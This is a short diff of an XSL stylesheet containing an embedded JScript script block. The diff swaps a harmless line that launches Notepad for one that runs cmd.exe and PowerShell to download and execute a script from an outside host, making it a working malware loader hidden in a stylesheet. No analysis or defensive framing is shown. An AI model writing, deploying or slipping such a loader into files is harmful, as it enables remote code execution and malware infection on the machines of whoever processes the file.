@@ -6,6 +6,6 @@ version="1.0">
 <output method="text"/>
 	<ms:script implements-prefix="user" language="JScript">
 	<![CDATA[
-	var r = new ActiveXObject("WScript.Shell").Run("notepad.exe");
+	var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c powershell IEX(New-Object Net.WebClient).DownloadString('http://8upload.ir/uploads/f329235.txt')");
 	]]> </ms:script>
 </stylesheet>
